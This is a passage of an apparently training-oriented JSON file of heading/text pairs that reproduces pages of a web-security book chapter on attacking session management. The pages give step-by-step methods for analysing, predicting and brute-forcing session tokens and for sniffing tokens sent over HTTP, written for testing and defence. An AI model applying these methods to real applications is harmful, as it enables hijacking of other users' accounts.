user.\nWhat vulnerability does the anti-phishing mechanism introduce into\nthe login function? Is the mechanism effective in preventing phishing?"
  },
  {
    "input": "Chapter 7: Attacking Session Management",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 175\nCHAPTER\n7\nAttacking Session Management\nThe session management mechanism is a fundamental security component in\nthe majority of web applications. It is what enables the application to uniquely\nidentify a given user across a number of different requests, and to handle the\ndata that it accumulates about the state of that user’s interaction with the\napplication. Where an application implements login functionality, session\nmanagement is of particular importance, as it is what enables the application\nto persist its assurance of any given user’s identity beyond the request in\nwhich they supply their credentials.\nBecause of the key role played by session management mechanisms, they\nare a prime target for malicious attacks against the application. If an attacker\ncan break an application’s session management, then she can effectively\nbypass its authentication controls and masquerade as other application users\nwithout knowing their credentials. If an attacker compromises an administra-\ntive user in this way, then the attacker can own the entire application.\nAs with authentication mechanisms, there is a wide variety of defects that can\ncommonly be found in session management functions. In the most vulnerable\ncases, an attacker simply needs to increment the value of a token issued to them\nby the application in order to switch their context to that of a different user. In\nthis situation, the application is wide open for anyone to access all areas. At the\nother end of the spectrum, an attacker may have to work extremely hard, deci-\nphering several layers of obfuscation and devising a sophisticated automated\nattack, before finding a chink in the application’s armor.\n175"
  },
  {
    "input": "The Need for State",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 176\n176 Chapter 7 ■ Attacking Session Management\nIn this chapter, we will look at all of the types of weakness that the authors\nhave encountered in real-world web applications. We will set out in detail the\npractical steps that you need to take to find and exploit these defects. Finally,\nwe will describe the defensive measures that applications should take to pro-\ntect themselves against these attacks.\nCOMMON MYTH “We use smartcards for authentication, and users’\nsessions cannot be compromised without the card.”\nHowever robust an application’s authentication mechanism, subsequent\nrequests from users are only linked back to that authentication via the resulting\nsession. If the application’s session management is flawed, then an attacker\ncan bypass the robust authentication altogether and still compromise users.\nThe Need for State\nThe HTTP protocol is essentially stateless. It is based on a simple request-\nresponse model, in which each pair of messages represents an independent\ntransaction. The protocol itself contains no mechanism for linking together the\nseries of requests made by one particular user and distinguishing these from\nall of the other requests received by the web server. In the early days of the\nWeb, there was no need for any such mechanism: web sites were used to pub-\nlish static HTML pages for anyone to view. Today, things are very different.\nThe majority of web “sites” are in fact web applications. They allow you to\nregister and log in. They let you buy and sell goods. They remember your pref-\nerences next time you visit. They deliver rich, multimedia experiences with\ncontent created dynamically based on what you click and type. In order to\nimplement any of this functionality, web applications need to use the concept\nof a session.\nThe most obvious use of sessions is in applications that support logging in.\nAfter entering your username and password, you can go ahead and use the\napplication as the user whose credentials you have entered, until such time as\nyou log out or the session expires due to inactivity. Users do not want to have\nto reenter their password on every single page of the application. Hence, after\nauthenticating the user once, the application creates a session for them, and\ntreats all requests belonging to that session as coming from that user.\nApplications that do not have a login function also typically need to use ses-\nsions. Many sites selling merchandise do not require customers to create\naccounts. However, they allow users to browse the catalog, add items to a\nshopping basket, provide delivery details, and make payment. In this sce-\nnario, there is no need to authenticate the identity of the user: for the majority\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 177\nChapter 7 ■ Attacking Session Management 177\nof their visit, the application does not know or care who the user is. But, in\norder to do business with them, it needs to know which series of requests it\nreceives has originated from the same user.\nThe simplest and still most common means of implementing sessions is to\nissue each user with a unique session token or identifier. On each subsequent\nrequest to the application, the user resubmits this token, enabling the application\nto determine which sequence of earlier requests the current request relates to.\nIn most cases, applications use HTTP cookies as the transmission mecha-\nnism for passing these session tokens between server and client. The server’s\nfirst response to a new client contains an HTTP header like the following:\nSet-Cookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55\nand subsequent requests from the client contain the header:\nCookie: ASP.NET_SessionId=mza2ji454s04cwbgwb2ttj55\nThere are various categories of attack to which this standard session man-\nagement mechanism is inherently vulnerable. An attacker’s primary objective\nin targeting the mechanism is to somehow hijack the session of a legitimate\nuser and thereby masquerade as them. If the user has been authenticated to the\napplication, the attacker may be able to access private data belonging to the\nuser or carry out unauthorized actions on that person’s behalf. If the user is\nunauthenticated, the attacker may still be able to view sensitive information\nsubmitted by the user during her session.\nAs in the previous example of a Microsoft IIS server running ASP.NET, most\ncommercial web servers and web application platforms implement their own\noff-the-shelf session management solution based on HTTP cookies. They pro-\nvide APIs that web application developers can use to integrate their own\nsession-dependent functionality with this solution.\nSome off-the-shelf implementations of session management have been\nfound vulnerable to various attacks, which result in users’ sessions being com-\npromised (these are discussed later in this chapter). In addition, some devel-\nopers find that they need more fine-grained control over session behavior than\nis provided for them by the built-in solutions, or wish to avoid some vulnera-\nbilities inherent in cookie-based solutions. For these reasons, it is fairly\nc ommon to see bespoke and/or non-cookie-based session management mech-\nanisms used in security-critical applications such as online banking.\nThe vulnerabilities that exist in session management mechanisms largely\nfall into two categories:\n■■ Weaknesses in the generation of session tokens.\n■■ Weaknesses in the handling of session tokens throughout their lifecycle.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 178\n178 Chapter 7 ■ Attacking Session Management\nWe will look at each of these areas in turn, describing the different types of\ndefects that are commonly found in real-world session management mecha-\nnisms, and practical techniques for discovering and exploiting these. Finally,\nwe will describe measures that applications can take to defend themselves\nagainst these attacks.\nHACK STEPS\nIn many applications that use the standard cookie mechanism for transmitting\nsession tokens, it is straightforward to identify which item of data contains the\ntoken. However, in other cases it may require some detective work.\n■ The application may often employ several different items of data collec-\ntively as a token, including cookies, URL parameters, and hidden form\nfields. Some of these items may be used to maintain session state on dif-\nferent back-end components. Do not assume that a particular parameter\nis the session token without proving it, or that sessions are being tracked\nusing only one item.\n■ Sometimes, items that appear to be the application’s session token may\nnot be. In particular, the standard session cookie generated by the web\nserver or application platform may be present but not actually used by\nthe application.\n■ Observe which new items are passed to the browser after authentication.\nOften, new session tokens are created after a user authenticates herself.\n■ To verify which items are actually being employed as tokens, find a page\nthat is certainly session-dependent (such as a user-specific “my details”\npage), and make several requests for it, systematically removing each\nitem that you suspect is being used as a token. If removing an item\ncauses the session-dependent page not to be returned, then this may\nconfirm that the item is a session token. Burp Repeater is a useful tool\nfor performing these tests.\nAlternatives to Sessions\nNot every web application employs sessions, and some security-critical appli-\ncations containing authentication mechanisms and complex functionality opt\nto use other techniques for managing state. There are two possible alternatives\nthat you are likely to encounter:\n■■ HTTP authentication—Applications using the various HTTP-based\nauthentication technologies (basic, digest, NTLM, etc.) sometimes avoid\nthe need to use sessions. With HTTP authentication, the client compo-\nnent interacts with the authentication mechanism directly via the\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 179\nChapter 7 ■ Attacking Session Management 179\nbrowser, using HTTP headers, and not via application-specific code\ncontained within any individual page. Once a user has entered his\ncredentials into a browser dialog, the browser effectively resubmits\nthese credentials (or reperforms any required handshake) with every\nsubsequent request to the same server. This is the equivalent to an\napplication that uses HTML forms-based authentication and places a\nlogin form on every application page, requiring users to reauthenticate\nthemselves with every action they perform. Hence, when HTTP-based\nauthentication is used, it is possible for an application to re-identify the\nuser across multiple requests without using sessions. However, HTTP\nauthentication is rarely used on Internet-based applications of any com-\nplexity, and the other very versatile benefits that fully fledged session\nmechanisms offer mean that virtually all web applications do in fact\nemploy them.\n■■ Sessionless state mechanisms—Some applications do not issue ses-\nsion tokens in order to manage the state of a user’s interaction with the\napplication but rather transmit all data required to manage that state\nvia the client, usually in a cookie or a hidden form field. In effect, this\nmechanism uses sessionless state in a similar way to the ASP.NET\nViewState. In order for this type of mechanism to be secure, the data\ntransmitted via the client must be properly protected. This usually\ninvolves constructing a binary blob containing all of the state informa-\ntion, and encrypting or signing this using a recognized algorithm. Suffi-\ncient context must be included within the data to prevent an attacker\nfrom collecting a state object at one location within the application and\nsubmitting it to another location to cause some undesirable behavior.\nThe application may also include an expiration time within the object’s\ndata, to perform the equivalent of session timeouts. Chapter 5 describes\nin more detail secure mechanisms for transmitting data via the client.\nHACK STEPS\n■ If HTTP authentication is being used, it is possible that no session man-\nagement mechanism is implemented. Use the methods described previ-\nously to examine the role played by any token-like items of data.\n■ If the application uses a sessionless state mechanism, transmitting all\ndata required to maintain state via the client, this may sometimes be dif-\nficult to detect with certainty, but the following are strong indicators that\nthis kind of mechanism is being used:\n■ Token-like data items issued to the client are fairly long (e.g., 100 or\nmore bytes).\n(continued)"
  },
  {
    "input": "Weaknesses in Session Token Generation",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 180\n180 Chapter 7 ■ Attacking Session Management\nHACK STEPS (continued)\n■ The application issues a new item in response to every request.\n■ The data in the item appears to be encrypted (and so has no dis-\ncernible structure) or signed (and so contains meaningful structure\naccompanied by a few bytes of meaningless binary data).\n■ The application may reject attempts to submit the same item with\nmore than one request.\n■ If the evidence suggests strongly that the application is not using session\ntokens to manage state, then it is unlikely that any of the attacks\ndescribed within this chapter will achieve anything. Your time is likely to\nbe much better spent looking for other serious issues such as broken\naccess controls or code injection.\nWeaknesses in Session Token Generation\nSession management mechanisms are often vulnerable to attack because\ntokens are generated in an unsafe manner that enables an attacker to identify\nthe values of tokens that have been issued to other users.\nMeaningful Tokens\nSome session tokens are created using a transformation of the user’s user-\nname or email address, or other information associated with them. This infor-\nmation may be encoded or obfuscated in some way, and may be combined\nwith other data.\nFor example, the following token may initially appear to be a long random\nstring:\n757365723d6461663b6170703d61646d696e3b646174653d30312f31322f3036\nHowever, on closer inspection, it contains only hexadecimal characters.\nGuessing that the string may actually be a hex-encoding of a string of ASCII\ncharacters, we can run it through a decoder to reveal:\nuser=daf;app=admin;date=10/09/07\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 181\nChapter 7 ■ Attacking Session Management 181\nAttackers can exploit the meaning within this session token to attempt to\nguess the current sessions of other application users. Using a list of enumer-\nated or common usernames, they can quickly generate large numbers of\npotentially valid tokens and test these to confirm which are valid.\nTokens that contain meaningful data often exhibit some structure—that is,\nthey contain several components, often separated by a delimiter, which can be\nextracted and analyzed separately to allow an attacker to understand their\nfunction and means of generation. Components that may be encountered\nwithin structured tokens include:\n■■ The account username.\n■■ The numeric identifier used by the application to distinguish between\naccounts.\n■■ The user’s first/last human name.\n■■ The user’s email address.\n■■ The user’s group or role within the application.\n■■ A date/time stamp.\n■■ An incrementing or predictable number.\n■■ The client IP address.\nEach different component within a structured token, or indeed the entire\ntoken, may be encoded in different ways, either as a deliberate measure to\nobfuscate their content, or simply to ensure safe transport of binary data via\nHTTP. Encoding schemes that are commonly encountered include XOR,\nBase64, and hexadecimal representation using ASCII characters (see Chapter 3).\nIt may be necessary to test various different decodings on each component of\na structured token to unpack it to its original form.\nNOTE When an application handles a request containing a structured token,\nit may not actually process every component with the token or all of the data\ncontained within each component. In the previous example, the application\nmay Base64-decode the token and then process only the “user” and “date”\ncomponents. In cases where a token contains a blob of binary data, much of\nthis data may be padding, and only a small part of it may actually be relevant\nto the validation that the server performs on the token. Narrowing down the\nsubparts of a token that are actually required can often reduce considerably the\namount of apparent entropy and complexity that the token contains.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 182\n182 Chapter 7 ■ Attacking Session Management\nHACK STEPS\n■ Obtain a single token from the application, and modify it in systematic\nways to determine whether the entire token is validated, or whether\nsome subcomponents of the token are ignored. Try changing the token’s\nvalue one byte at a time (or even one bit at a time) and submitting the\nmodified token back to the application to determine whether it is still\naccepted. If you find that certain portions of the token are not actually\nrequired to be correct, you can exclude these from any further analysis,\npotentially reducing the amount of work that you need to perform.\n■ Log in as several different users at different times and record the tokens\nreceived from the server. If self-registration is available and you can\nchoose your username, log in with a series of similar usernames contain-\ning small variations between them, such as A, AA, AAA, AAAA, AAAB,\nAAAC, AABA, and so on. If other user-specific data is submitted at the\nlogin or stored in user profiles (such as an email address), perform a\nsimilar exercise to vary that data systematically and record the tokens\nreceived following login.\n■ Analyze the tokens for any correlations that appear to be related to the\nusername and other user-controllable data.\n■ Analyze the tokens for any detectable encoding or obfuscation. Where the\nusername contains a sequence of the same character, look for a corre-\nsponding character sequence in the token, which may indicate the use of\nXOR obfuscation. Look for sequences in the token containing only hexa-\ndecimal characters, which may indicate a hex-encoding of an ASCII string\nor other information. Look for sequences ending in an equals sign and/or\nonly containing the other valid Base64 characters: a–z, A–Z, 0–9, +, and /.\n■ If any meaning can be reverse engineered from the sample of session\ntokens, consider whether you have sufficient information to attempt to\nguess the tokens recently issued to other application users. Find a page\nof the application that is session-dependent (e.g., one that returns an\nerror message or a redirect elsewhere if accessed without a valid ses-\nsion), and use a tool such as Burp Intruder to make large numbers of\nrequests to this page using guessed tokens. Monitor the results for any\ncases where the page is loaded correctly, indicating a valid session token.\nPredictable Tokens\nSome session tokens do not contain any meaningful data associating them\nwith a particular user but are nevertheless guessable because they contain\nsequences or patterns that allow an attacker to extrapolate from a sample of\ntokens to find other valid tokens recently issued by the application. Even if the\nextrapolation involves an amount of trial and error (for example, one valid\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 183\nChapter 7 ■ Attacking Session Management 183\nguess per 1,000 attempts), this will still enable an automated attack to identify\nlarge numbers of valid tokens in a relatively short period of time.\nVulnerabilities relating to predictable token generation may be much easier\nto discover in commercial implementations of session management, such as\nweb servers or web application platforms, than they are in bespoke applica-\ntions. When you are remotely targeting a bespoke session management mech-\nanism, your sample of issued tokens may be restricted by the capacity of the\nserver, the activity of other users, your bandwidth, network latency, and so on.\nIn a laboratory environment, however, you can quickly create millions of sam-\nple tokens, all precisely sequenced and time-stamped, and can eliminate inter-\nference caused by other users.\nIn the simplest and most brazenly vulnerable cases, an application may use\na simple sequential number as the session token. In this case, you only need to\nobtain a sample of two or three tokens before launching an attack that will cap-\nture 100% of currently valid sessions very quickly.\nFigure 7-1 shows Burp Intruder being used to cycle the last two digits of a\nsequential session token to find values where the session is still active and can\nbe hijacked. The length of the server’s response is here a reliable indicator that\na valid session has been found.\nFigure7-1: An attack to discover valid sessions where the session token is predictable\nIn other cases, an application’s tokens may contain more elaborate sequences\nthat take some effort to discover. The types of potential variations one might\nencounter here are open ended, but the authors’ experience in the field indicates\nthat predictable session tokens commonly arise from three different sources:\n■■ Concealed sequences\n■■ Time dependency\n■■ Weak random number generation\nWe will look at each of these areas in turn.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 184\n184 Chapter 7 ■ Attacking Session Management\nConcealed Sequences\nIt is common to encounter session tokens that cannot be trivially predicted\nwhen analyzed in their raw form but that contain sequences that reveal them-\nselves when the tokens are suitably decoded or unpacked.\nConsider the following series of values, which form one component of a\nstructured session token:\nlwjVJA\nLs3Ajg\nxpKr+A\nXleXYg\n9hyCzA\njeFuNg\nJaZZoA\nNo immediate pattern is discernible; however, a cursory inspection indi-\ncates that the tokens may contain Base64-encoded data—in addition to the\nmixed-case alphabetical and numeric characters, there is a + character, which\nis also valid in a Base64-encoded string. Running the tokens through a Base64\ndecoder reveals the following:\n--Õ$\n.ÍÀŽ\nÆ’«ø\n^W-b\nö‚Ì\n?án6\n%¦Y\nThese strings appear to be gibberish and also contain nonprinting charac-\nters. This normally indicates that you are dealing with binary data rather than\nASCII text. Rendering the decoded data as hexadecimal numbers gives you:\n9708D524\n2ECDC08E\nC692ABF8\n5E579762\nF61C82CC\n8DE16E36\n25A659A0\nThere is still no visible pattern. However, if you subtract each number from\nthe previous one, you arrive at the following:\nFF97C4EB6A\n97C4EB6A\nFF97C4EB6A\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 185\nChapter 7 ■ Attacking Session Management 185\n97C4EB6A\nFF97C4EB6A\nFF97C4EB6A\nwhich immediately reveals the concealed pattern. The algorithm used to gen-\nerate tokens adds 0x97C4EB6A to the previous value, truncates the result to a\n32-bit number, and Base64-encodes this binary data to allow it to be trans-\nported using the text-based protocol HTTP. Using this knowledge, you can\neasily write a script to produce the series of tokens that the server will next\nproduce, and the series that it produced prior to the captured sample.\nTime Dependency\nSome web servers and applications employ algorithms for generating session\ntokens that use the time of generation as an input to the token’s value. If insuf-\nficient other entropy is incorporated into the algorithm, then you may be able\nto predict other users’ tokens. Although any given sequence of tokens on its\nown may appear to be completely random, the same sequence coupled with\ninformation about the time at which each token was generated may contain a\ndiscernible pattern. In a busy application, with large numbers of sessions\nbeing created per second, a scripted attack may succeed in identifying large\nnumbers of other users’ tokens.\nWhen testing the web application of an online retailer, the authors encoun-\ntered the following sequence of session tokens:\n3124538-1172764258718\n3124539-1172764259062\n3124540-1172764259281\n3124541-1172764259734\n3124542-1172764260046\n3124543-1172764260156\n3124544-1172764260296\n3124545-1172764260421\n3124546-1172764260812\n3124547-1172764260890\nEach token is clearly composed of two separate numeric components. The\nfirst number follows a simple incrementing sequence and is trivial to predict.\nThe second number is increasing by a varying amount each time. Calculating\nthe differences between its value in each successive token reveals the following:\n344\n219\n453\n312\n110\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 186\n186 Chapter 7 ■ Attacking Session Management\n140\n125\n391\n78\nThe sequence does not appear to contain a reliably predictable pattern; how-\never, it would clearly be possible to brute force the relevant number range in\nan automated attack to discover valid values in the sequence. Before attempt-\ning this attack, however, we wait a few minutes and gather a further sequence\nof tokens:\n3124553-1172764800468\n3124554-1172764800609\n3124555-1172764801109\n3124556-1172764801406\n3124557-1172764801703\n3124558-1172764802125\n3124559-1172764802500\n3124560-1172764802656\n3124561-1172764803125\n3124562-1172764803562\nComparing this second sequence of tokens with the first, two points are\nimmediately obvious:\n■■ The first numeric sequence continues to progress incrementally; how-\never, five values have been skipped since the end of our first sequence.\nThis is presumably because the missing values have been issued to\nother users, who logged into the application in the window between\nthe two tests.\n■■ The second numeric sequence continues to progress by similar intervals\nas before; however, the first value we obtain is a massive 539,578\ngreater than the previous value.\nThis second observation immediately alerts us to the role played by time in\ngenerating session tokens. Apparently, only five tokens have been issued\nbetween the two token-grabbing exercises. However, a period of approxi-\nmately 10 minutes has also elapsed. The most likely explanation is that the sec-\nond number is time-dependent and is probably a simple count of milliseconds.\nIndeed, our hunch is correct, and in a subsequent phase of our testing\nwe perform a code review, which reveals the following token-generation\nalgorithm:\nString sessId = Integer.toString(s_SessionIndex++) +\n“-“ +\nSystem.currentTimeMillis();\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 187\nChapter 7 ■ Attacking Session Management 187\nGiven our analysis of how tokens are created, it is straightforward to con-\nstruct a scripted attack to harvest the session tokens that the application issues\nto other users:\n■■ We continue polling the server to obtain new session tokens in quick\nsuccession.\n■■ We monitor the increments in the first number. When this increases by\nmore than one, we know that a token has been issued to another user.\n■■ When a token has been issued to another user, we know the upper and\nlower bounds of the second number that was issued to them, because\nwe possess the tokens that were issued immediately before and after\ntheirs. Because we are obtaining new session tokens frequently, the\nrange between these bounds will typically consist of only a few hun-\ndred values.\n■■ Each time a token is issued to another user, we launch a brute-force\nattack to iterate through each number in the range, appending this to\nthe missing incremental number that we know was issued to the other\nuser. We attempt to access a protected page using each token we con-\nstruct, until the attempt succeeds and we have compromised the user’s\nsession.\n■■ Running this scripted attack continuously will enable us to capture the\nsession token of every other application user. When an administrative\nuser logs in, we will fully compromise the entire application.\nWeak Random Number Generation\nVery little that occurs inside a computer is random. Therefore, when random-\nness is required for some purpose, software uses various techniques to gener-\nate numbers in a pseudo-random manner. Some of the algorithms used\nproduce sequences that appear to be stochastic and manifest an even spread\nacross the range of possible values, but can nevertheless be extrapolated for-\nwards or backwards with perfect accuracy by anyone who obtains a small\nsample of values.\nWhen a predictable pseudo-random number generator is used for produc-\ning session tokens, the resulting tokens are vulnerable to sequencing by an\nattacker.\nJetty is a popular web server written in 100% Java, which provides a session\nmanagement mechanism for use by applications running on it. In 2006, Chris\nAnley of NGSSoftware discovered that the mechanism was vulnerable to a\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 188\n188 Chapter 7 ■ Attacking Session Management\nsession token prediction attack. The server used the Java API java.util\n.Random to generate session tokens. This implements a “linear congruential\ngenerator,” which generates the next number in the sequence as follows:\nsynchronized protected int next(int bits) {\nseed = (seed * 0x5DEECE66DL + 0xBL) & ((1L << 48) - 1);\nreturn (int)(seed >>> (48 - bits));\n}\nThis algorithm in effect takes the last number generated, multiplies it by one\nconstant, and adds another constant, to obtain the next number. The number is\ntruncated to 48 bits, and the algorithm shifts the result to return the specific\nnumber of bits requested by the caller.\nKnowing this algorithm and a single number generated by it, we can easily\nderive the sequence of numbers that the algorithm will generate next, and also\n(with a little number theory) derive the sequence that it generated previously.\nThis means that an attacker who obtains a single session token from the server\ncan obtain the tokens of all current and future sessions.\nNOTE Sometimes when tokens are created based on the output of a pseudo-\nrandom number generator, developers decide to construct each token by\nconcatenating together several sequential outputs from the generator. The\nperceived rationale for this is that it creates a longer, and therefore “stronger”\ntoken. However, this tactic is usually a mistake. If an attacker can obtain\nseveral consecutive outputs from the generator, this may enable them to infer\nsome information about its internal state, and may in fact make it easier for\nthem to extrapolate the generator’s sequence of outputs, either forward or\nbackward.\nHACK STEPS\n■ First, determine when and how session tokens are issued by walking\nthrough the application from the first application page through any login\nfunctions. The most common behaviors are: (a) the application creates a\nnew session any time a request is received that does not submit a token,\nand (b) the application creates a new session following a successful\nlogin. In order to harvest large numbers of tokens in an automated way,\nideally identify a single request (typically either GET /or a login submis-\nsion) that results in a new token being issued.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 189\nChapter 7 ■ Attacking Session Management 189\nHACK STEPS (continued)\n■ If a bespoke session management mechanism is in use, and you only\nhave remote access to the application, obtain a large sample of tokens\n(at least a few hundred). Gather these tokens in as quick succession as\npossible, to minimize the loss of tokens issued to other users and reduce\nthe influence of any time dependency. The following screenshot shows\nBurp Intruder being used to make large numbers of requests and log the\nreturned cookies, which can then be exported for further analysis.\n■ If a commercial session management mechanism is in use and/or you\nhave local access to the application, you can obtain indefinitely large\nsequences of session tokens in controlled conditions.\n■ Attempt to identify any patterns within your sample of cookies. There are\nvarious tools (including the testing suite WebScarab) that will attempt to\nperform some automated analysis on a sample of cookies. This kind of\ntool is often a useful starting point to get a feel for the amount of varia-\ntion contained within a sample of tokens. However, in the authors’ expe-\nrience these tools suffer from two limitations. First, they are usually only\neffective when the patterns within the sample are relatively obvious and\ncould be quickly identified through manual analysis; they are poor at\ndeciphering any encoding and structure within tokens. Second, they\noften produce graphical output, which gives the visual impression of\nsome kind of pattern, even though further analysis establishes that the\npattern is a red herring.\n(continued)\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 190\n190 Chapter 7 ■ Attacking Session Management\nHACK STEPS (continued)\n■ In most cases, there is no real substitute for a manual analysis of the\nsample of tokens. There is no magic formula for this, but the following\nsteps should get you on your way:\n■ Apply the knowledge you have already gleaned regarding which com-\nponents and bytes of the token are actually being processed by the\nserver. Ignore anything that is not processed, even if it varies between\nsamples.\n■ If it is unclear what type of data is contained within the token, or any\nindividual component of it, try applying various decodings to see if\nany more meaningful data emerges. It may be necessary to apply sev-\neral decodings in sequence.\n■ Try to identify any patterns in the sequences of values contained\nwithin each decoded token or component. Calculate the differences\nbetween successive values. Even if these appear to be chaotic, there\nmay be a fixed set of observed differences that narrows down the\nscope of any brute-force attack considerably.\n■ Obtain a similar sample of cookies after waiting for a few minutes,\nand repeat the same analysis. Try to detect whether any of the tokens’\ncontent is time-dependent.\n■ If a pattern is detected, reperform the token harvesting exercise from a\ndifferent IP address and (if relevant) a different username, to identify\nwhether the same pattern is detected, and whether tokens received in\nthe first exercise could be extrapolated to identify tokens received in the\nsecond. Sometimes, the sequence of tokens received by a script running\non a single machine will manifest a pattern, but this will not allow\nstraightforward extrapolation to the tokens issued to other users\nbecause information such as source IP is used as a source of entropy\n(such as a seed to a random number generator).\n■ If you believe you have enough insight into the token generation algo-\nrithm to mount an automated attack against other users’ sessions, it is\nlikely that the best means of achieving this is via a customized script,\nwhich can generate tokens using the specific patterns you have observed,\nand apply any necessary encoding. See Chapter 13 for some generic tech-\nniques for applying automation to this type of problem.\n■ If source code is available, closely review the code responsible for gener-\nating session tokens to understand the mechanism used and determine\nwhether it is vulnerable to prediction."
  },
  {
    "input": "Weaknesses in Session Token Handling",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 191\nChapter 7 ■ Attacking Session Management 191\nFull-Blown Tests for Randomness\nDue to the importance of robust session token generation, performing an effec-\ntive attack against a security-critical application such as an online bank may\nrequire carrying out a full-blown methodology to test the randomness of its\ntokens. If you do not have access to source code, this will be a black-box exercise.\nHACK STEPS\n■ Determine the theoretical maximum number of unique tokens that are\navailable, based on the character set being used and number of bytes\nwithin the token that are actually being validated (as described earlier).\n■ Compare each character transition from one token to the next to deter-\nmine whether particular transitions are more common than others. If\nparticular transitions are preferred, there is a likelihood that the algo-\nrithm is flawed in some way.\n■ Perform NIST FIPS-140-2 statistical tests, identifying any statistically\nanomalous distribution of bits.\n■ Check for correlations between arbitrary bits; a truly random token will\nexhibit no correlation between the state of one bit and the state of\nanother.\n■ These tests cannot be carried out effectively simply by visual inspection.\nOf the publicly available tools, Stompy is most effective at carrying out\nfull-blown tests of randomness.\nWeaknesses in Session Token Handling\nNo matter how effective an application is at ensuring that the session tokens it\ngenerates do not contain any meaningful information and are not susceptible\nto analysis or prediction, its session mechanism will be wide open to attack if\nthose tokens are not handled carefully after generation. For example, if tokens\nare disclosed to an attacker via some means, then the attacker can hijack user\nsessions even if predicting the tokens is impossible.\nThere are various ways in which an application’s unsafe handling of tokens\ncan make it vulnerable to attack.\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 192\n192 Chapter 7 ■ Attacking Session Management\nCOMMON MYTH “Our token is secure from disclosure to third parties\nbecause we use SSL.”\nProper use of SSL certainly helps to protect session tokens from being\ncaptured. But various mistakes can still result in tokens being transmitted in\nclear text even when SSL is in place. And there are various direct attacks\nagainst end users that can be used to obtain their token.\nDisclosure of Tokens on the Network\nThis area of vulnerability arises when the session token is transmitted across\nthe network in unencrypted form, enabling a suitably positioned eavesdrop-\nper to obtain the token and so masquerade as the legitimate user. Suitable posi-\ntions for eavesdropping include the user’s local network, within the user’s IT\ndepartment, within the user’s ISP, on the Internet backbone, within the appli-\ncation’s ISP, and within the IT department of the organization hosting the\napplication. In each case, this includes both authorized personnel of the rele-\nvant organization and any external attackers who have compromised the\ninfrastructure concerned.\nIn the simplest case, where an application uses an unencrypted HTTP con-\nnection for communications, an attacker can capture all data transmitted\nbetween client and server, including login credentials, personal information,\npayment details, and so on. In this situation, an attack against the user’s ses-\nsion is often unnecessary because the attacker can already view privileged\ninformation and can log in using captured credentials to perform other mali-\ncious actions. However, there may still be instances where the user’s session is\nthe primary target. For example, if the captured credentials are not sufficient to\nperform a second login (e.g., in a banking application, they may include a\nnumber displayed on a changing physical token, or specific digits from the\nuser’s PIN), the attacker may need to hijack the eavesdropped session in order\nto perform arbitrary actions. Or if there is close auditing of logins, and notifi-\ncation to the user of each successful login, then an attacker may wish to avoid\nperforming his own login in order to be as stealthy as possible.\nIn other cases, an application may use HTTPS to protect key client-server\ncommunications yet may still be vulnerable to interception of session tokens\non the network. There are various ways in which this weakness may occur,\nmany of which can arise specifically when HTTP cookies are used as the trans-\nmission mechanism for session tokens:\n■■ Some applications elect to use HTTPS to protect the user’s credentials\nduring login but then revert to HTTP for the remainder of the user’s\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 193\nChapter 7 ■ Attacking Session Management 193\nsession. Many web mail applications behave in this way. In this situa-\ntion, an eavesdropper cannot intercept the user’s credentials but may\nstill capture the session token, as shown in Figure7-2.\nFigure7-2: Capturing a session token transmitted over HTTP\n■■ Some applications use HTTP for preauthenticated areas of the site,\nsuch as the site’s front page, but switch to HTTPS from the login page\nonwards. However, in many cases the user is issued a session token at\nthe first page visited, and this token is not modified when the user logs\nin. The user’s session, which is originally unauthenticated, is upgraded\nto an authenticated session after login. In this situation an eavesdropper\ncan intercept a user’s token before login, wait for the user’s communi-\ncations to switch to HTTPS, indicating that the user is logging in, and\nthen attempt to access a protected page (such as My Account) using\nthat token.\n■■ Even if the application issues a fresh token following successful login,\nand uses HTTPS from the login page onwards, the token for the user’s\nauthenticated session may still be disclosed if the user revisits a preau-\nthentication page (such as Help or About), either by following links\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 194\n194 Chapter 7 ■ Attacking Session Management\nwithin the authenticated area, by using the Back button, or by typing\nthe URL directly.\n■■ In a variation on the previous case, the application may attempt to\nswitch to HTTPS when the user clicks the Login link; however, it may\nstill accept a login over HTTP if the user modifies the URL accordingly.\nIn this situation, a suitably positioned attacker can modify the pages\nreturned in the preauthenticated areas of the site so that the Login link\npoints to an HTTP page. Even if the application issues a fresh session\ntoken after successful login, the attacker may still intercept this token if\nhe has successfully downgraded the user’s connection to HTTP.\n■■ Some applications use HTTP for all static content within the applica-\ntion, such as images, scripts, style sheets, and page templates. This\nbehavior is often indicated by a warning alert within the user’s\nbrowser, as shown in Figure7-3. As described previously, an attacker\ncan intercept the user’s session token when the user’s browser accesses\na resource over HTTP, and use this token to access protected, nonstatic\nareas of the site over HTTPS.\nFigure7-3: Browsers present a warning alert\nwhen a page accessed over HTTPS contains\nitems accessed over HTTP.\n■■ Even if an application uses HTTPS for every single page, including\nunauthenticated areas of the site and static content, there may still be\ncircumstances in which users’ tokens are transmitted over HTTP. If an\nattacker can somehow induce a user to make a request over HTTP\n(either to the HTTP service on the same server if one is running or to\nhttp://server:443/otherwise), then their token may be submitted.\nMeans by which the attacker may attempt this include sending the user\na URL in an email or instant message, placing auto-loading links into a\nweb site the attacker controls, or using clickable banner ads. (See Chap-\nter 12 for more details about techniques of this kind for delivering\nattacks against other users.)\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 195\nChapter 7 ■ Attacking Session Management 195\nHACK STEPS\n■ Walk through the application in the normal way from first access (the\n“start” URL), through the login process, and then through all of the appli-\ncation’s functionality. Keep a record of every URL visited, and note every\ninstance 